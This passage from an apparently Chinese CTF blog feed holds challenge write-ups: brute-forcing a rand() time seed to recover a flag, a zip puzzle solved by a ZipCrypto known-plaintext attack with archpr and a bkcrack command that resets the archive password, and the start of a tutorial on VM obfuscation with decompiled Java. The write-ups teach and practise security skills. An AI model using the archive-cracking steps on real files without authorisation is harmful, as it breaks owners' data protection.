check[<span class="number">6</span>];</span><br><span class="line">check[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span> ^ <span class="number">0x9</span>;</span><br><span class="line">check[<span class="number">1</span>] = <span class="string">&#x27;&#123;&#x27;</span> ^ <span class="number">0x63</span>;</span><br><span class="line">check[<span class="number">2</span>] = <span class="string">&#x27;l&#x27;</span>^ <span class="number">0xC6</span>;</span><br><span class="line">check[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>^ <span class="number">0x65</span>;</span><br><span class="line">check[<span class="number">4</span>] = <span class="string">&#x27;&#125;&#x27;</span>^ <span class="number">0xFD</span>;</span><br><span class="line">check[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>^ <span class="number">0xFA</span>;</span><br><span class="line"><span class="type">int</span> r[<span class="number">42</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> time = <span class="number">1672416000</span>; time &lt; <span class="number">1706253391</span>; time++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">srand</span>(time);</span><br><span class="line"><span class="keyword">if</span> (check[<span class="number">0</span>] != (r[<span class="number">0</span>] = <span class="built_in">rand</span>() % <span class="number">255</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (check[<span class="number">1</span>] != (r[<span class="number">1</span>] = <span class="built_in">rand</span>() % <span class="number">255</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line">r[i] = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line"><span class="keyword">if</span> ((check[<span class="number">2</span>] != r[<span class="number">11</span>]) || (check[<span class="number">3</span>] != r[<span class="number">12</span>]) || (check[<span class="number">4</span>] != r[<span class="number">31</span>]) || (check[<span class="number">5</span>] != r[<span class="number">32</span>]))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (time &lt; <span class="number">1706253391</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;the seed is: &quot;</span> &lt;&lt; time&lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;[&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">42</span>; j++) &#123;</span><br><span class="line">cout &lt;&lt; r[j];</span><br><span class="line"><span class="keyword">if</span> (j != <span class="number">41</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到seed:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the seed is: <span class="number">1682145110</span></span><br><span class="line">[<span class="number">111,24,236,196</span>,<span class="number">58,186,93,97</span>,<span class="number">61,51,169,170</span>,<span class="number">2,17,113,139</span>,<span class="number">162,38,14,77</span>,<span class="number">131,66,112,202</span>,<span class="number">80,113,231,107</span>,<span class="number">15,50,159,128</span>,<span class="number">155,183,227,184</span>,<span class="number">224,28,16,180</span>,<span class="number">42</span>,<span class="number">57</span>]</span><br></pre></td></tr></table></figure><p>最后异或一下，发现是打乱的flag</p><p>根据这个对应写代码逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line">check = [<span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x58</span>, <span class="number">0xDD</span>, <span class="number">0x3F</span>, <span class="number">0x4C</span>, </span><br><span class="line">         <span class="number">0x0F</span>, <span class="number">0x0B</span>, <span class="number">0x98</span>, <span class="number">0xC6</span>, <span class="number">0x65</span>, <span class="number">0x21</span>, <span class="number">0x41</span>, <span class="number">0xED</span>, </span><br><span class="line">         <span class="number">0xC4</span>, <span class="number">0x0B</span>, <span class="number">0x3A</span>, <span class="number">0x7B</span>, <span class="number">0xE5</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0xA9</span>, </span><br><span class="line">         <span class="number">0x31</span>, <span class="number">0x41</span>, <span class="number">0xD7</span>, <span class="number">0x52</span>, <span class="number">0x6C</span>, <span class="number">0x0A</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, </span><br><span class="line">         <span class="number">0xFA</span>, <span class="number">0x84</span>, <span class="number">0xDB</span>, <span class="number">0x89</span>, <span class="number">0xCD</span>, <span class="number">0x7E</span>, <span class="number">0x27</span>, <span class="number">0x85</span>, </span><br><span class="line">         <span class="number">0x13</span>, <span class="number">0x08</span>]</span><br><span class="line">rand = [<span class="number">111</span>,<span class="number">24</span>,<span class="number">236</span>,<span class="number">196</span>,<span class="number">58</span>,<span class="number">186</span>,<span class="number">93</span>,<span class="number">97</span>,<span class="number">61</span>,<span class="number">51</span>,<span class="number">169</span>,<span class="number">170</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">113</span>,<span class="number">139</span>,<span class="number">162</span>,<span class="number">38</span>,<span class="number">14</span>,<span class="number">77</span>,<span class="number">131</span>,<span class="number">66</span>,<span class="number">112</span>,<span class="number">202</span>,<span class="number">80</span>,<span class="number">113</span>,<span class="number">231</span>,<span class="number">107</span>,<span class="number">15</span>,<span class="number">50</span>,<span class="number">159</span>,<span class="number">128</span>,<span class="number">155</span>,<span class="number">183</span>,<span class="number">227</span>,<span class="number">184</span>,<span class="number">224</span>,<span class="number">28</span>,<span class="number">16</span>,<span class="number">180</span>,<span class="number">42</span>,<span class="number">57</span>]</span><br><span class="line"></span><br><span class="line">miao =    <span class="string">&#x27;flag&#123;0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ&#125;&#x27;</span></span><br><span class="line">mia2 =    <span class="string">&#x27;f&#123;37BFGNRVZlg02468ACEGIKMOQSUWY&#125;a159DHLPTX&#x27;</span></span><br><span class="line"></span><br><span class="line">back = [<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"></span><br><span class="line">a = pxor(check,rand)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        <span class="keyword">if</span> (miao[i]==mia2[j]):</span><br><span class="line">            back[i]=a[j]</span><br><span class="line"></span><br><span class="line">pl(back)</span><br><span class="line"><span class="comment">#flag&#123;0305f8f2-14b6-fg7b-7c7a-010299c881e1&#125;</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>一开始没看出来标志的大小写有问题TAT，于是直接调试找的main。。。</p><p>其次，由于srand随机的是当前时间，所以调试的时候值几乎不可能是当时的值，所以只有爆破才能找到真的seed，因此就要先把第一个变换通过动调看出来是打乱才可以（当然也不能验证）</p><h2 id="misc">misc</h2><h3 id="谁偷吃了我的外卖">谁偷吃了我的外卖</h3><p>这道题是压缩包<br>先打开，看到小凯.jpg</p><p>继续打开，发现外卖箱.zip<br>继续打开，一个flag文件夹和一堆外卖，</p><p>结构是：用户xxx_yyyy的外卖，yyyy很明显可以看出是base64，根据hint（在信息中）：I can give you a hint: - = /<br>But there was a takeaway that was partially eaten.</p><p>可以知道这里的-就是/，那么先写一个脚本把文件中的yyyy提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_filenames</span>(<span class="params">zip_path</span>):</span><br><span class="line">    <span class="comment"># 打开压缩文件</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="comment"># 获取压缩文件中的所有文件名</span></span><br><span class="line">        all_files = zip_ref.namelist()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 对文件名进行解码</span></span><br><span class="line">        all_files = [filename.encode(<span class="string">&#x27;cp437&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">for</span> filename <span class="keyword">in</span> all_files]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取每个文件名中的用户编号并按照编号排序文件名</span></span><br><span class="line">        all_files.sort(key=<span class="keyword">lambda</span> filename: <span class="built_in">int</span>(re.search(<span class="string">r&#x27;用户(\d+)&#x27;</span>, filename).group(<span class="number">1</span>)) <span class="keyword">if</span> re.search(<span class="string">r&#x27;用户(\d+)&#x27;</span>, filename) <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 初始化一个空字符串用于存储字符</span></span><br><span class="line">        combined = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 对每个文件名进行操作</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> all_files:</span><br><span class="line">            <span class="comment"># 提取文件名中倒数第7到倒数第4的字符</span></span><br><span class="line">            part = filename[-<span class="number">7</span>:-<span class="number">3</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 将字符添加到 combined 中</span></span><br><span class="line">            combined += part</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> combined</span><br><span class="line"></span><br><span class="line">result = process_filenames(<span class="string">&#x27;外卖箱.zip&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>那么把他base64解码</p><p>解码的结果是一堆乱码，看最后可以看到有png，PK，.md的字样，也就是说这是一个压缩包</p><p>转换为hex，开头是04 14 00 00 00 08 00，再看上面的提示，补充前三个字符（50 4B 03），然后一起复制到新文件中，得到新压缩包，里面是之前加密的压缩包的flag文件夹中的两个文件，同时钥匙.png表示这是deflate+zipcrypyo，既然是zipcrypyo，就可以用明文攻击，使用archpr找到密钥（密钥是由密码生成，同时加密使用密钥）：</p><p>[ 48ff002a 56e00484 380c5c49 ]</p><p>然后用bkcrack解密压缩包</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bkcrack -C <span class="selector-tag">a</span><span class="selector-class">.zip</span> -k <span class="number">48</span>ff002a <span class="number">56</span>e00484 <span class="number">380</span>c5c49 -U new<span class="selector-class">.zip</span> ok</span><br></pre></td></tr></table></figure><p>将原始密码换成ok</p><p>然后解密即可</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W<span class="number">1</span>sh_y<span class="number">0</span>u_AaaAaaaaaaaaaaa_w<span class="number">0</span><span class="symbol">nderfu1</span>_CTF_jour<span class="symbol">ne9</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 压缩包 </tag>
            
            <tag> upx </tag>
            
            <tag> 随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_RE_VM</title>
      <link href="/posts/670cb6e7.html"/>
      <url>/posts/670cb6e7.html</url>
      
        <content type="html"><![CDATA[<h2 id="伪虚拟机保护">伪虚拟机保护</h2><blockquote><p><strong>虚拟机</strong>（英语：virtual machine），在计算机科学中的体系结构里，是指一种特殊的软件，可以在计算机平台和终端用户之间建立一种环境，而终端用户则是基于虚拟机这个软件所建立的环境来操作其它软件。虚拟机（VM）是计算机系统的仿真器，通过软件模拟具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统，能提供物理计算机的功能。</p></blockquote><p>很明显，ctf中的vm技术和虚拟机并不相同，却有一定关系</p><p>伪虚拟机保护是一种模拟，它将程序可执行代码转换为自定义的中间操作码(operationcode)，如果操作码是一个字节，将它称为(bytecode)。中间操作码通过模拟器执行，实现程序原来的功能，同时阻碍逆向。这也是大多数跨平台语言可以成立的原因，先将代码翻译成中间码，这个代码就可以在任何有对应虚拟机的地方执行。</p><h3 id="实例">实例</h3><p>JVM</p><p>两个文件</p><p>JVM.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p000;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: JVM */</span></span><br><span class="line"><span class="comment">/* loaded from: JVM.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JVM</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: program */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">byte</span>[] flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(strArr[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        flag = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">        fileInputStream.read(flag);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        m0vm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: vm */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m0vm</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span>[] iArr2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; flag.length) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (flag[i]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> flag[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b2</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> iArr2[b];</span><br><span class="line">                    iArr2[b] = iArr2[b2];</span><br><span class="line">                    iArr2[b2] = i3;</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">n_next</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[n_next] = iArr2[n_next] + flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b3] = iArr2[b3] + iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b4</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b4] = iArr2[b4] - flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b5</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b5] = iArr2[b5] - iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b6</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b6] = iArr2[b6] * flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b7</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b7] = iArr2[b7] * iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b8</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b8] = iArr2[b8] / flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b9</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b9] = iArr2[b9] / iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b10</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b10] = iArr2[b10] % flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b11</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b11] = iArr2[b11] % iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b12</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b12] = iArr2[b12] &lt;&lt; flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b13</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b13] = iArr2[b13] &lt;&lt; iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">                    iArr2[flag[i + <span class="number">1</span>]] = bufferedReader.read();</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i4] = bufferedReader.read();</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">                    System.out.print((<span class="type">char</span>) iArr2[flag[i + <span class="number">1</span>]]);</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    System.out.print((<span class="type">char</span>) iArr[i2]);</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b14</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b15</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (iArr2[b14] == <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b15;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b16</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b17</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (iArr2[b16] != <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b17;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                    i = flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i5] = iArr2[flag[i + <span class="number">1</span>]];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">53</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    iArr2[flag[i + <span class="number">1</span>]] = iArr[i2];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i6] = flag[i + <span 